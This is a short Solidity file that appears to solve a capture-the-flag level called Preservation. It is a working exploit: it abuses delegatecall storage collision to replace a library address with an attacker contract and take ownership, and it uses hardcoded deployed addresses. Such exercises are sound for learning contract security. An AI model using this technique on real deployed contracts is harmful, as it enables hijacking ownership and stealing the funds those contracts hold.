// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
  function setFirstTime(uint _timeStamp) public {}
}

contract PreservationSol {

    address _addr = 0x71CC7773414F9E62e906b5EBAc444170287FDE62;
    Preservation contr = Preservation(_addr);

    //deployed address for PreservationExploit
    address exploitAddr = 0xA363E680B87ef689508999dbe7adac73f31c534C;

    constructor() {
        //changes timeZone1Library address to the address of my exploit contract
        contr.setFirstTime(uint(uint160(exploitAddr)));
        contr.setFirstTime(1);
    }

}

//Deploy this first
contract PreservationExploit {
  
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint) public {
        owner = 0xAAAA6AE640ddd7c44d34C0c1A1ea6E80636aF697;
    }
  
}